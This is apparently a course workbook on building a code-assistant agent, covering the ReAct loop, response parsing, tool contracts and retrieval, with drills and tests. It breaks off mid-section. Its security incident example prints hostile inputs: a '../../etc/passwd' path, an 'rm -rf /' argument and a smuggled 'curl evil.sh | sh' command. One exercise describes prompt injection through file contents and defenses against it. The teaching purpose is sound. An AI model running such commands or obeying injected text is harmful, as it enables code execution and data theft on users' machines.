# Module 3 Practice Workbook — AI Agents: Tool Use, ReAct, Multi-Agent Systems

> **Serves:** [`../lectures/03-agents.md`](../lectures/03-agents.md) | **Track weeks:** 5–6 (Milestone A5) | **Mastery protocol:** [README.md](README.md)
>
> The rule of this workbook: **a topic is mastered when all three levels are done AND verified —
> not when it "feels understood".** Level 1 proves mechanics, Level 2 proves real repo work,
> Level 3 proves senior judgment. Each level has a `Verify` command that must pass before moving on.
>
> **Active vehicle:** DevMate — `projects/04-ai-engineering/devmate/` — an AI repo assistant whose
> agent searches code, reads files, runs tests, and proposes patches. The whole workspace repo is
> your test corpus. The roadmap's Definition of Done for weeks 5–6 (see
> [`docs/roadmap/active-track-10-week.md`](../../roadmap/active-track-10-week.md)):
> (1) the agent answers a question requiring ≥ 2 tools, (2) the MCP server is reachable from a
> real MCP client, (3) infinite loops are provably prevented — with a test.

## How to use this workbook

| Rule | Where things go |
|------|-----------------|
| Unit tests (no infra, deterministic) | `projects/04-ai-engineering/devmate/tests/unit/` |
| Integration tests (need `make up`: Postgres/Redis/Qdrant) | `projects/04-ai-engineering/devmate/tests/integration/` (dir exists, empty — you create the first files) |
| Load/perf tests | `projects/04-ai-engineering/devmate/tests/load/` (dir exists, empty) |
| Evaluation harness + results | `projects/04-ai-engineering/devmate/eval/` (dir exists, empty; `make eval` currently points at `eval/run_ragas.py` which does not exist yet — your agent eval script is a separate file) |
| Hand-rolled vs LangGraph comparison, design notes | `projects/04-ai-engineering/devmate/notes.md` (roadmap's designated home) |
| Decisions | `docs/decisions/` per the ADR template at `templates/adr.template.md` (sections: Context, Decision Drivers, Options Considered, Decision, Consequences) — new ADRs via `infra/scripts/new-adr.ps1` |
| Failure-mode log | `projects/04-ai-engineering/devmate/mistakes.md` (the track's explicit learning loop — same file Module 1 uses; one entry per failure: what you tried, what broke, the fix, the rule you extracted) |

**Command map (root Makefile):** `make test` = `cd projects/04-ai-engineering/devmate && poetry run pytest -q --cov=devmate --cov-report=term-missing` · `make test-int` = pytest `-m integration` (needs `make up`) · `make types` = `poetry run mypy src/` · `make lint` = `poetry run ruff check .` · `make eval` = `poetry run python eval/run_ragas.py` · `make cli ARGS="ask '...'"` = run the DevMate CLI (commands: `stats`, `ask`, `ingest`, `serve`, `cost`) · `make up` = docker compose up Postgres/Redis/Qdrant.

**Local command note (this workstation):** `make` and `poetry` are not installed here. Run the underlying commands directly: `& .venv\Scripts\python.exe -m pytest -q --cov=devmate` etc. from `projects/04-ai-engineering/devmate/` (see the repo `AGENTS.md`). The `tests/integration/`, `tests/load/`, and `eval/` folders exist (empty apart from their READMEs) — you create the first files in each.

**Real modules you will touch (verified to exist):**
`src/devmate/agent/agent.py` (ReActAgent, BaseTool, the 4 tools, TOOLS registry, LangGraphAgent stub), `src/devmate/mcp/server.py` (DevMateMCPServer, 3 MCP tools, stdio + SSE transports), `src/devmate/retrieve/retriever.py` (`get_retriever`, `retriever.retrieve(query, query_vector, filter=..., use_reranker=True)`), `src/devmate/retrieve/rag.py`, `src/devmate/llm/client.py` (`llm_client.complete(messages, model, max_tokens, temperature, stream)`), `src/devmate/index/vector_store.py`, `src/devmate/cli/main.py`, `src/devmate/guards/guardrails.py` (`PromptInjectionGuardrail`), `src/devmate/obs/tracing.py` (`tracer.trace("agent.step")`), `src/devmate/obs/cost.py` (`cost_tracker.record_usage / get_summary / estimate_cost`).

---

## 3.1 Agent Fundamentals

### Real-world problem

A dev-tools startup sells "AI code assistance" to three different customers who use it three
different ways. The first customer (an internal support team) wants a **chatbot**: ask a question,
get an answer, never touch the codebase. The second (a platform team) wants a **copilot**: the AI
suggests diffs, a human clicks "apply". The third (a CI team) wants an **agent**: "when the build
breaks, investigate and fix it" — nobody watches it run. The founder used the three words
interchangeably in the marketing copy, so customers bought the wrong product. The support inbox
fills with tickets: "your agent deleted a file" (it was a chatbot that could only answer), "your
agent answered instead of acting" (it was a copilot without an approval UI), "your agent looped for
three hours" (nobody had defined autonomy, termination, or who approves what).

**The decision the engineer must make:** which product form serves which workflow, and — for the
agent product — which of the four core properties must be designed-in from day one and which are
features to add later. The failure is a *classification* failure, and classification drives
architecture: tools, memory, autonomy limits, and approval gates all follow from it.

### Topic 3.1a — Agent vs Chatbot vs Copilot

**Mastery =** you can classify any AI product along the five axes (interaction, tools, memory,
reasoning, autonomy), justify the classification with examples, and explain the architectural
consequence of each axis for DevMate.

**Level 1 — Drill** (mechanics, 20–45 min)
Classify each of the six products below along all five axes into `Chatbot | Copilot | Agent` using
the lecture's table. Write your answer table first, then check against the key.

| # | Product | Interaction | Tools | Memory | Reasoning | Autonomy |
|---|---------|-------------|-------|--------|-----------|----------|
| 1 | FAQ bot that answers from a static KB | Q&A only | none | session | simple | low |
| 2 | GitHub Copilot | suggests w/ approval | limited | limited ctx | moderate | medium |
| 3 | DevMate agent (`ask` that calls `search_code` then `run_tests` itself) | acts autonomously | full | persistent | multi-step | high |
| 4 | "AutoGPT"-style task runner on a sandboxed VM | acts autonomously | full | persistent | multi-step | high |
| 5 | IDE inline completion (autocomplete) | suggests w/ approval | none | limited ctx | simple | low |
| 6 | A `search_code` tool exposed over MCP (no loop around it) | — | — | — | — | — |

**Expected key:** 1 = Chatbot · 2 = Copilot · 3 = Agent · 4 = Agent · 5 = Copilot · 6 = **neither** —
a tool is not an agent; the agent is the *loop* around the tool. For #6, justify: an MCP server
exposing tools has no autonomy, no reasoning, no goal — it is infrastructure an agent (or a human)
uses. A strong answer also notes #2 vs #5: both are "suggest with approval" but differ in reasoning
depth and tool use; the axis that separates them is *how much of the reasoning loop is automated*.

**Level 2 — Applied** (DevMate, 1–3 h)
Classify DevMate's own surface area against the lecture table and write the result to
`projects/04-ai-engineering/devmate/notes.md` under a new section `## 3.1 Product classification`.
Cover: the CLI `ask` command (`make cli ARGS="ask 'list the Python files with no type hints'"`),
the MCP server (`src/devmate/mcp/server.py`), and the ReActAgent (`src/devmate/agent/agent.py`).
For each, state (a) classification, (b) which axes make it that class, (c) one sentence on the
architectural consequence (e.g., "ask is an Agent today because ReActAgent drives tools itself; its
memory is the AgentContext history, not a user profile").

**Acceptance criteria:** the section names all three surfaces, classifies each on at least 3 axes,
and one of the three classifications is a *deliberate gap* (e.g., "DevMate has no copilot surface —
the `propose_patch` tool is a step toward one").

**Level 3 — Stretch** (production-grade, 3–6 h)
The product-positioning decision: DevMate ships ONE surface first — the autonomous CLI agent
(`ask`, the ReActAgent), a copilot IDE extension (suggestions with approval), or a chatbot service
(Q&A from the index). Write an ADR-style decision into `notes.md` (`## 3.1 Product form ADR`) with
the `templates/adr.template.md` sections: Context (the startup's three customers from the section's
real-world problem — support team, platform team, CI team), Decision Drivers (customer willingness
to watch it act, blast radius of autonomy, effort to build: agent reuses ReActAgent + 4 tools,
copilot needs an IDE surface + approval UI, chatbot needs no loop), Options Considered (A agent
CLI / B copilot extension / C chatbot) with pros and cons each, Decision, Consequences (what the
other two surfaces cost later — e.g., if you build the agent first, the copilot is an approval
gate away: that is exactly 3.5c's human-in-the-loop), and revisit conditions (e.g., "revisit when
a customer asks for an IDE surface — the approval gate is the porting point"). Justify with the
five axes: state explicitly which axis each option optimizes and which it sacrifices.

**Verify:**
```bash
grep -n "3.1 Product form ADR" projects/04-ai-engineering/devmate/notes.md
grep -n "3.1 Product classification" projects/04-ai-engineering/devmate/notes.md
grep -c "Chatbot\|Copilot\|Agent" projects/04-ai-engineering/devmate/notes.md
```
Expected: both headings exist; the classification terms appear ≥ 6 times; your ADR contains all
five sections and states the chosen surface and the axis it sacrifices (e.g., "agent CLI:
maximizes autonomy, sacrifices the approval UX that a copilot customer expects"); your written
answer for each surface matches the axes in your own Level-1 key.

**Common failure modes:**
- Symptom: you classify by marketing, not behavior → Cause: you used "what it claims to be"
  instead of the five axes → Fix: re-derive from the table's columns: if it has no tools and no
  memory, it is not an agent regardless of branding.
- Symptom: you call the MCP server "an agent" → Cause: conflating capability surface with the loop
  → Fix: remember #6 — a tool registry without a control loop has zero autonomy.

**Interview:** *"Is a copilot an agent? Where do you draw the line?"*
A strong answer: no — draw the line at the *control loop*: does the system decide its own next
action toward a goal (agent), does it suggest an action awaiting human approval (copilot), or does
it only answer (chatbot)? Then give one real example per class from DevMate (ReActAgent = agent,
`propose_patch` = copilot-seed, `get_repo_stats` MCP tool = chatbot-grade). Mention that the
boundary shifts: a copilot becomes an agent the moment approval is automated away, and that shift
is exactly what the human-in-the-loop gate in 3.5c must prevent.

### Topic 3.1b — Core Properties: Autonomy, Reactivity, Pro-activeness, Social Ability

**Mastery =** you can name the property a scenario demonstrates or is missing, and you can point
to a concrete design that fails when one property is absent.

**Level 1 — Drill** (mechanics, 20–45 min)
For each scenario, name the property **demonstrated** (A = Autonomy, R = Reactivity, P =
Pro-activeness, S = Social Ability) and/or the property **missing** that caused the failure.

| # | Scenario | Property |
|---|----------|----------|
| 1 | DevMate indexes a repo, then the file `auth.py` is deleted mid-task. The agent's next `read_file` still returns the cached chunk because the index is not refreshed — it answers about code that no longer exists. | missing **Reactivity** |
| 2 | The agent is told "fix the failing test" and, with no human prompt, searches for the test, reads the source, runs pytest, and proposes a patch — completing all steps on its own. | demonstrated **Autonomy** |
| 3 | The agent's only trigger is the user's message; a CI build fails at 2 AM and nothing reacts until someone files a ticket. | missing **Pro-activeness** |
| 4 | The DevMate agent cannot ask the CI system for the failing log — it guesses the failure from the code alone. | missing **Social Ability** |
| 5 | The agent re-runs `run_tests` with the same args after the first run already succeeded, because the observation was discarded. | missing **Reactivity** (and observability) |

**Expected key:** 1 R, 2 A, 3 P, 4 S, 5 R. For scenario 1, be precise: the agent *is* reactive to
the tool result, but not to the *environment* — reactivity means perceiving environment change, so
a stale index violates it. A strong Level-1 finish: for each property write one sentence on which
line of DevMate implements it (`agent.py` `run()` loop = autonomy; `SearchCodeTool` calling
`get_retriever()` per invocation = partial reactivity; no pro-active trigger exists today = gap;
no agent-to-agent messaging = gap).

**Level 2 — Applied** (DevMate, 1–3 h)
Audit `ReActAgent` in `projects/04-ai-engineering/devmate/src/devmate/agent/agent.py` against the
four properties. For each property write a short subsection in `notes.md` (`## 3.1 Core properties
audit`): (a) one line of evidence from the code (exact function/line reference, e.g., "`run()`:
`for step_num in range(self.max_steps)` drives the loop without user input → Autonomy"), (b) one
missing capability today, (c) one sentence on the production risk of that gap. At least two of the
four must be honest gaps (pro-activeness and social ability are expected gaps — do not invent
evidence).

**Acceptance criteria:** four subsections, each with code evidence, a named gap, and a risk
statement; the audit agrees with the Level-1 key (reactivity = partial, pro-activeness = missing).

**Verify:**
```bash
grep -n "3.1 Core properties audit" projects/04-ai-engineering/devmate/notes.md
grep -n "Autonomy\|Reactivity\|Pro-activeness\|Social Ability" projects/04-ai-engineering/devmate/notes.md
```
Expected: heading + ≥ 4 property mentions. If you cannot cite a real line for a property, that is
itself the finding — write "no evidence: gap".

**Level 3 — Stretch** (production-grade, 3–6 h)
Design the **missing property** with the highest business value for DevMate: Pro-activeness (watch
the repo and offer to act when a test starts failing) *or* Social Ability (let the DevMate agent
hand a failing CI run to a second agent that owns the deployment pipeline — a two-agent handoff
with a shared task contract). Produce: (a) a one-page design (trigger, perception, action,
termination, budget) — no code required; (b) an **ADR-style decision** in `notes.md` following the
`templates/adr.template.md` sections (Context, Decision Drivers, Options Considered, Decision,
Consequences) justifying which property you added and why, including the failure mode you are
protecting against (for Pro-activeness: the 2 AM CI failure that cost a release; for Social
Ability: an agent that guesses instead of asking); (c) cost/risk bounds: how many proactive runs
per day are allowed, what could make a proactive agent *worse* than no agent (false alarms
desensitize the team — name that trade-off explicitly).

**Verify:** `grep -n "ADR" projects/04-ai-engineering/devmate/notes.md` returns your decision
heading; your written section contains all five ADR sections; you can state the revisit condition
(e.g., "revisit when CI volume exceeds 20 failures/day — proactive scanning cost outweighs value").

**Common failure modes:**
- Symptom: you claim DevMate is fully autonomous → Cause: you read the lecture's ideal, not the
  code → Fix: the audit must quote `agent.py` lines; the loop is autonomous *per goal*, but there
  is no goal-discovery.
- Symptom: your pro-activeness design has no cost ceiling → Cause: you forgot the property has a
  blast radius (each proactive run spends tokens and can act on stale state) → Fix: budget runs/day
  and add a human opt-out.

**Interview:** *"You said the agent is 'reactive' — what happens if reactivity breaks?"*
A strong answer: reactivity is the loop's fuel — perceive → reason → act → observe. If the agent
cannot perceive changes (stale index, discarded observations), it re-acts to old state: it re-reads
files it already read, re-runs tests that already passed, and ultimately produces confident wrong
answers. Ground it in DevMate: `SearchCodeTool` queries `get_retriever()` per call (fresh-ish), but
`run_tests` observations are fed back as strings and nothing invalidates earlier conclusions — that
is a reactivity bug waiting to happen. Then name the fix: observation hashing + index versioning.

---

## 3.2 The ReAct Pattern

### Real-world problem

The production incident that made ReAct "boring but mandatory": a customer pointed the first DevMate
prototype at their monorepo and asked it to "find the bug in the payment retry logic". The agent
searched, read a file, searched again with a slightly different query, read the same file, searched
again. Three hours later the run was killed at **$412.37** — roughly 1,900 LLM calls — because the
loop had **no termination condition, no step cap, and no structured output**. Every response was
free prose; the parser guessed what the model "probably meant"; when the model stopped producing
tool calls, the harness couldn't tell, and simply asked the model again. The engineer's decision:
rebuild the loop so that (a) each iteration has a visible structure (perceive → reason → act →
observe), (b) the model communicates intent in a parseable format, and (c) the loop provably
terminates. The $412 run is the unit of comparison for every design choice in this section.

### Topic 3.2a — The Core Loop: Perceive → Reason → Act → Observe

**Mastery =** you can trace any run of DevMate's `ReActAgent.run()` into the four phases, state the
iteration and termination rules, and prove on paper that a run terminates.

**Level 1 — Drill** (mechanics, 20–45 min)
Given this goal and tool set, trace the run. Goal: `"Find the authentication middleware and explain
how it works"`. Tools: `search_code`, `read_file`. The stub LLM produces these responses, in order
(the model never produces a `Final Answer` until told to):

| Step | LLM response |
|------|--------------|
| 1 | `Thought: I need to find where auth middleware is defined. Action: search_code Input: {"query": "authentication middleware"}` |
| 2 | `Thought: The results point to middleware/auth.py. I need to read it. Action: read_file Input: {"file_path": "middleware/auth.py"}` |
| 3 | `Thought: The middleware sets a request context. I have enough. Final Answer: The auth middleware at middleware/auth.py validates the JWT and attaches the user to request.state.user.` |

Write the trace table: for each step fill `phase`, `action`, `input`, `observation-source`, and
`next-phase`. Then answer: (1) how many *tool executions* happen? (2) at what step does the loop
terminate and why? (3) what does DevMate's `run()` do with the `AgentStep` for step 3 (see
`agent.py`: `action="finish"`, `state=AgentState.DONE`)?

**Expected key:** steps 1–2 execute tools (2 tool executions), step 3 is the terminal step:
`final_answer` is not None → record `AgentStep(step_id=3, action="finish", state=DONE)` and return
the answer. Termination is *in-band*: the model signals done with the `Final Answer` section, not
by silence — the lesson of the $412 run. If the model never emits `Final Answer`, `run()` exits
after `range(self.max_steps)` with the fallback string `"Maximum steps reached without completing
the task."` — that is the outer guarantee.

**Level 2 — Applied** (DevMate, 1–3 h)
Write the first **deterministic** test of the real loop in
`projects/04-ai-engineering/devmate/tests/unit/test_agent_loop.py`. No API key, no infra: monkeypatch
`devmate.agent.agent.llm_client.complete` to return the scripted responses from Level 1 (an async
stub returning objects with `.content`), construct `ReActAgent(tools=["search_code", "read_file"])`,
call `await agent.run(goal)`, and assert: (1) the returned string contains `"authentication
middleware"`, (2) `agent.context.current_step == 3`, (3) the tool calls recorded were
`search_code` then `read_file` then `finish`, (4) exactly two tool executions happened (count
steps where `state != DONE` and `action != "finish"`).

**Acceptance criteria:** the test passes without network access; it asserts termination and
step-count — not just "no exception".

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_agent_loop.py -q
```
Expected: `3 passed` (or the equivalent count of your asserts as separate test functions). If
`llm_client.complete` returns an object without `.content`, check the real signature in
`src/devmate/llm/client.py` and fix the stub, not the test.

**Level 3 — Stretch** (production-grade, 3–6 h)
Termination under *all* failure paths. Build a tape suite of 12 scripted LLM responses covering:
never emitting `Final Answer` (cap hit), emitting it on step 1, tool raising an exception inside
`execute`, tool returning `ToolResult(success=False)`, the model emitting `Action: nonexistent_tool`,
`Input:` with unparseable JSON, an empty response, and a response that is only `Thought: ...`. For
each tape assert: (1) `run()` returns within ≤ `max_steps` iterations, (2) `context.current_step ≤
max_steps`, (3) no uncaught exception escapes `run()`. Then write the **cost table** into
`notes.md` (`## 3.2 Termination economics`): with `max_steps=10`, ~1.5k input + 300 output tokens
per step at ~$3/M input, $15/M output (lecture-era Sonnet pricing), compute worst-case cost per run,
and compare to the $412 incident (unbounded, ~1,900 calls). State the formula and the default you
choose. ADR-style: Options = cap at 5 / 10 / 20; Decision; Consequences.

**Verify:** `poetry run pytest tests/unit/test_agent_termination.py -q` → all tape tests pass;
`grep -n "3.2 Termination economics" projects/04-ai-engineering/devmate/notes.md` → section exists;
your table shows the incident run vs capped run cost and a chosen default with a revisit condition.

**Common failure modes:**
- Symptom: test passes but ran the real API → Cause: `llm_client` was imported at module top in a
  way your monkeypatch missed (you patched `agent.llm_client` but the module imported
  `from devmate.llm.client import llm_client` — patch the name *in the using module*) → Fix: patch
  `devmate.agent.agent.llm_client`, and add `assert not api_called` by making the stub raise if used.
- Symptom: infinite test → Cause: your stub returns the same non-terminal response forever and the
  step cap was bypassed by an early `return` on an exception → Fix: assert `current_step ≤
  max_steps` in the same test; a test that never returns is the $412 incident in miniature.

**Interview:** *"Walk me through the ReAct loop. Where can it hang, and how do you guarantee it doesn't?"*
A strong answer draws the four phases, names the two termination mechanisms (in-band `Final
Answer` + out-of-band step cap), and then the failure cases: model never emits Final Answer →
cap; model repeats the same tool call → loop detection (3.4c); tool hangs → timeout in the tool
(120 s in `RunTestsTool`); parser fails → the raw-text fallback must still count as a step so the
budget is consumed. Finish with the incident: every missing mechanism was present in the $412 run.

### Topic 3.2b — The Thought/Action/Input/Final-Answer Prompt Format and Parsing It Reliably

**Mastery =** you can parse any well-formed response, survive the known malformed cases, and state
exactly what DevMate's parser does for each error class.

**Level 1 — Drill** (mechanics, 20–45 min)
Using the real parser semantics in `agent.py` (`_parse_response` / `_save_field`: sections are
split on lines starting with `Thought:`, `Action:`, `Input:`, `Final Answer:`; continuation lines
append; `Input` is `json.loads`-ed with fallback `{"raw": text}` on `JSONDecodeError`), predict the
output of `(thought, action, action_input, final_answer)` for each input:

| # | Raw response | Expected |
|---|--------------|----------|
| 1 | `Thought: I need to find the middleware.\nAction: search_code\nInput: {"query": "auth"}` | `thought="I need to find the middleware."`, `action="search_code"`, `input={"query":"auth"}`, `final=None` |
| 2 | `Thought: let me think\n\nInput: {"query": "auth"}` (no Action) | `thought="let me think"`, `action=None`, `input={"query":"auth"}` — parser does NOT require Action; `run()` then emits the unknown-action observation `Unknown action: None...` |
| 3 | `Input: {"query": "auth",}` (trailing comma) | `json.loads` raises → fallback `{"raw": '{"query": "auth",}'}` — action_input is the raw dict; this is the *documented* current behavior (fragile) |
| 4 | `Input: {'query': 'auth'}` (single quotes) | `json.loads` raises → fallback `{"raw": ...}` |
| 5 | `Final Answer: The middleware validates the JWT.` | `final="The middleware validates the JWT."`, everything else empty |
| 6 | `Thought: preamble\nFinal Answer:\nThe answer is on the next line` | `final="The answer is on the next line"` — content after the colon, plus continuation lines, joined |
| 7 | `Action: run_tests\nInput: {"args": "-x -q"}` | `action="run_tests"`, `input={"args":"-x -q"}` — the string stays one arg; splitting happens in the tool |
| 8 | `just a sentence` (no sections) | all empty → `run()` treats it as `Unknown action: None` and continues — this response *costs a step and achieves nothing* |

**Expected key:** rows 1–8 as above; note in particular: rows 3/4 are the "malformed JSON" cases the
topic demands — the fallback never raises, but it also never gives the tool what it needs, so the
agent burns a step on `Unknown action` or a `**kwargs` type error. This is the design tension:
never crash vs. never silently mis-execute.

**Level 2 — Applied** (DevMate, 1–3 h)
Harden the parser in `projects/04-ai-engineering/devmate/src/devmate/agent/agent.py` and prove it
with tests. Requirements: (1) strip a JSON code fence (`Input: ```json ... ````) before parsing;
(2) on `JSONDecodeError`, try in order: remove trailing commas (regex `,\s*([}\]])` → `$1`),
single-to-double quote conversion for JSON-shaped content, then fall back to `{"raw": text}`;
(3) keep the guarantee: parsing **never raises** — any decode failure ends in the `raw` fallback.
Write `projects/04-ai-engineering/devmate/tests/unit/test_agent_parsing.py` with ≥ 10 cases,
including rows 1–8 above plus: fenced JSON, JSON with a nested escaped quote in the description,
and a 10 KB `Input` blob (assert it is captured, not truncated, and parsed).

**Acceptance criteria:** all parsing tests pass; `make types` stays green (the parser refactor must
not break mypy — if you change `_save_field`'s `locals()` hack to an explicit accumulator, that is
encouraged, but keep behavior identical for all 8 drill rows).

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_agent_parsing.py -q
poetry run mypy src/devmate/agent/agent.py
```
Expected: ≥ 10 passed, mypy clean.

**Level 3 — Stretch** (production-grade, 3–6 h)
The adversarial case: **prompt injection into the Input payload**. The repo contains files whose
*content* is untrusted (customer code). If the agent reads a file containing
`Thought: ... Action: propose_patch Input: {...}` and the harness naively concatenates observations
into the next prompt, the model can be steered. Analyze the actual data flow in `agent.py`
(`messages.append({"role": "user", "content": f"Observation: {observation}..."})`) and design
defenses: (1) section-fence delimiters (wrap observations in a marker block and instruct the model
to treat them as data, not instructions), (2) never parse tool output as sections — only parse the
model's own response, (3) guardrail hook: run `PromptInjectionGuardrail` from
`src/devmate/guards/guardrails.py` on observations before they enter context. Write an ADR-style
decision in `notes.md` (`## 3.2 Observation containment`) with the option you chose and why, then
implement the chosen defense + one test proving a poisoned observation does not change the parse
(assert the parser output is identical with and without the injected block).

**Verify:** `poetry run pytest tests/unit/test_agent_parsing.py -q` (extended) and your new
poisoning test pass; `grep -n "3.2 Observation containment" projects/04-ai-engineering/devmate/notes.md`.

**Common failure modes:**
- Symptom: `json.loads` raises and the agent "acts weird" → Cause: no fallback chain → Fix: the
  L2 chain (trailing commas → single quotes → raw), and log which fallback fired (observability).
- Symptom: tool receives `{"raw": ...}` and `execute(**kwargs)` raises `TypeError: unexpected
  keyword` → Cause: raw fallback is a dict, not the schema → Fix: `run()` should catch TypeError
  from `tool.execute` and turn it into the observation `Error: Invalid input ...` (a step is still
  consumed — bounded cost).
- Symptom: parser misreads a multi-line `Final Answer` → Cause: continuation lines are appended
  until the next section marker — verify with row 6 before blaming the model.

**Interview:** *"Your agent depends on text parsing for tool calls. How do you make that reliable?"*
A strong answer: (1) the format is a *protocol* — the system prompt specifies it and you parse
strictly by section markers; (2) the parser is total — it never raises, every malformed input
maps to a defined output (raw fallback), so the loop always progresses; (3) fallback chains fix the
known LLM JSON sins (trailing commas, single quotes, fenced blocks); (4) the real production answer
is to move to structured tool-calling when the model supports it, keeping the text protocol as a
compatibility layer — and the text protocol is what makes the parser unit-testable with tapes.

---

## 3.3 Tool Design for Code Agents

### Real-world problem

Two incidents, one root cause: **the tool contract is both a UX surface and a security boundary,
and DevMate's prototypes treated it as neither.** Incident A — a competitor's agent with tool
descriptions like `search_code: "Search stuff"` and `read_file: "Read stuff"`: tool-selection
accuracy was 60% on their eval set; the model called `read_file` on directory paths, `run_tests`
with `{"args": "-m 'rm -rf /'"}` arguments, and once tried to `search_code` a *path* instead of a
query. The model is not stupid — the contract was. Incident B — a security review of a prototype
agent found `read_file` accepted `../../etc/passwd` (naive `Path.cwd() / file_path` without
`resolve()` checks) and `run_tests` shelled out with `shell=True`, making `test_path="; curl
evil.sh | sh"` a remote-code-execution path. **The decision:** the tool interface — name,
description, JSON schema, execution guardrails — is the product's quality ceiling and its attack
surface. Design it like a public API, because to the model it *is* a public API.

### Topic 3.3a — The Tool Interface Contract: Name, Description, Schema

**Mastery =** you can write a tool contract that a model selects correctly 90%+ of the time, and
you can predict the failure when a contract is vague.

**Level 1 — Drill** (mechanics, 20–45 min)
The four DevMate tools exist in `agent.py` with real descriptions. Given the ten goals below,
write the tool you would expect a well-behaved model to select *first* (S = search_code, R =
read_file, T = run_tests, P = propose_patch, N = none/unknown):

| # | Goal | First tool |
|---|------|-----------|
| 1 | "Find the authentication middleware and explain how it works" | S |
| 2 | "Run tests for the user service and report failures" | T |
| 3 | "Propose a fix for the SQL injection vulnerability in query_builder" | S → P (search first, then propose) |
| 4 | "Find all usages of the deprecated `legacy_auth` function" | S |
| 5 | "Explain the data flow from API request to database in the order service" | S → R |
| 6 | "Show me the full text of config.py" | R |
| 7 | "Do my taxes" | N — out of scope; a strong agent says so instead of forcing a tool |
| 8 | "Read the README" | R |
| 9 | "Is the test suite green?" | T |
| 10 | "Change the retry policy in api client" | R → P |

**Expected key:** as above. Then the *rewrite drill*: `get_repo_stats` in
`src/devmate/mcp/server.py` is described as `"Get repository statistics and overview"`. Rewrite it
so a model knows *when* to use it and *what it returns* (target ≤ 2 sentences, verb-first, include
an example arg). Expected style: `"Get repository statistics (total indexed chunks, vector store,
embedding model). Use for repo-level overview questions like 'how big is the index'; not for
finding code."` — the "when NOT to use" clause is what cuts false selections.

**Level 2 — Applied** (DevMate, 1–3 h)
Implement **input validation** for the contract in `projects/04-ai-engineering/devmate/src/devmate/agent/agent.py`:
before `tool.execute(**action_input)`, validate against `parameters_schema`: (1) required keys
present (per `"required"`), (2) value types match (`string`/`integer`), (3) unknown keys are
rejected (do NOT pass them through). On violation, return the observation
`Error: invalid input for {tool}: {reason}. Schema: {parameters_schema}` — never call the tool, and
let the loop continue so the model can recover. Write
`projects/04-ai-engineering/devmate/tests/unit/test_tool_contract.py` with ≥ 8 cases: missing
`query`, `query` as int, extra key `evil`, `top_k` as string, valid call passes through, etc.

**Acceptance criteria:** validation is a separate function (testable, e.g.
`validate_input(schema, kwargs) -> tuple[bool, str]`); invalid inputs never reach `execute`
(assert via a stub tool that records calls).

**Verify:**
```bash
cd projects/04-ai-engineering/devmate
poetry run pytest tests/unit/test_tool_contract.py -q
```
Expected: ≥ 8 passed, including "unknown key rejected" and "valid call reaches tool exactly once".

**Level 3 — Stretch** (production-grade, 3–6 h)
Build the **description-quality regression bench**: a mini eval that measures tool-selection
accuracy. Create `projects/04-ai-engineering/devmate/eval/tool_selection_bench.py` with the 20
goals from the lecture's test set plus your own, each labeled with the expected first tool. Two
variants of the description set (current vs. your rewritten set from Level 1). If an LLM key is
available, run both variants through `llm_client.complete` with a "pick a tool" prompt and compute
selection accuracy per variant; if no key, implement the bench with a **fake selector** (rule-based
keyword scorer) so the harness itself is proven, and document that the real number must be measured
with a key. Target: ≥ 90% with the good descriptions, and a written explanation of *why*
description wording moved accuracy (specificity of "when to use / when not", example args in the
description, verb-first). Write results + an ADR-style description-style guide into `notes.md`
(`## 3.3 Tool description guide`).

**Verify:** `cd projects/04-ai-engineering/devmate && poetry run python eval/tool_selection_bench.py`
prints a per-variant accuracy table; `grep -n "3.3 Tool description guide" notes.md` → guide exists
with the "when NOT to use" rule.

**Common failure modes:**
- Symptom: model calls `run_tests` to "verify" a doc change → Cause: description doesn't say when
  not to use → Fix: add "Use to verify code behavior; not for documentation questions".
- Symptom: `search_code` gets called with a file path as `query` → Cause: description says "Search
  query" without saying *semantic, not path* → Fix: "natural language description or symbol name —
  not a file path (use read_file for exact paths)".
- Symptom: model passes extra keys the tool ignores → Cause: schema lists no `additionalProperties:
  false` and no validation → Fix: L2 validation rejects unknown keys with a recoverable error.

**Interview:** *"Why do tool descriptions matter more than the tool implementation?"*
A strong answer: the model can only select correctly what it can distinguish. Descriptions are the
model's *only* view of the tool — vague names produce 60% selection accuracy, and each wrong call
costs a step, tokens, and user trust. A good description encodes: what it does, when to use it,
when NOT to use it, and the shape of args. Implementation quality is irrelevant if the model never
invokes the right tool — so contract quality is the quality ceiling.

### Topic 3.3b — search_code: Integrating the RAG Retriever

**Mastery =** you can explain the data flow query → embedding → retrieve → rerank → format, and
you can test the tool without the retriever.

**Level 1 — Drill** (mechanics, 20–45 min)
`SearchCodeTool.execute` (real code in `agent.py`): trace the flow — (1) `get_retriever()`, (2)
`embedding_service.embed([query])` → `embeddings[0]`, (3) optional `filter_dict["language"]`, (4)
`retriever.retrieve(query, query_vector, filter=filter_dict, use_reranker=True)`, (5) format each
result as `[i] {filename}{ | chunk_type}{ | name} (score: {score:.3f})\n{content[:500]}` joined by
`"\n\n---\n\n"`, else `"No results found."`. Given a fake retriever returning three results with
metadata `{filename: "auth.py", chunk_type: "function", name: "require_auth"}`, scores `0.91234`,
`0.5`, `0.123`, write the exact formatted string (mind the 3-decimal rounding, the 500-char
truncation, and the `---` separators). Then state: what happens when `top_k=1`? when results are
empty? when `retriever.retrieve` raises?

**Expected key:** `[1] auth.py | function | require_auth (score: 0.912)\n<content[:500]>` … joined
by `\n\n---\n\n`; empty → `content="No results found."`, `success=True` (not an error — no results
is a valid observation); exception → `ToolResult(success=False, error=str(e))`. The design point:
**a tool error is a first-class observation**, never a crash.

**Level 2 — Applied** (DevMate, 1–3 h)
Create the first real integration test for the tool:
`projects/04-ai-engineering/devmate/tests/integration/test_search_code_tool.py` marked
`@pytest.mark.integration`. Setup: `make up` (Qdrant), `make cli ARGS="ingest ."` (index the
DevMate repo — the whole workspace root is indexable per the README protocol). Then:
`SearchCodeTool().execute(query="authentication middleware", top_k=3)` — assert `success=True`,
`metadata["result_count"] >= 1`, and `content` contains a filename. Add a language-filter case:
`execute(query="vector store", language="python", top_k=3)` — assert every result is Python. If no
API keys are configured, assert against whatever the retriever returns and note the dependency in
the test docstring (embedding + reranker calls are external).

**Acceptance criteria:** test passes against the live stack; it is tagged `integration` so
`make test` (unit-only) stays green without infra.

**Verify:**
```bash
make up
make cli ARGS="ingest ."
cd projects/04-ai-engineering/devmate && poetry run pytest -q -m integration tests/integration/test_search_code_tool.py
```
Expected: `1 passed` (or 2). If ingestion of the whole workspace is slow, ingest `projects/04-ai-engineering/devmate` instead and document it.

**Level 3 — Stretch** (production-grade, 3–6 h)
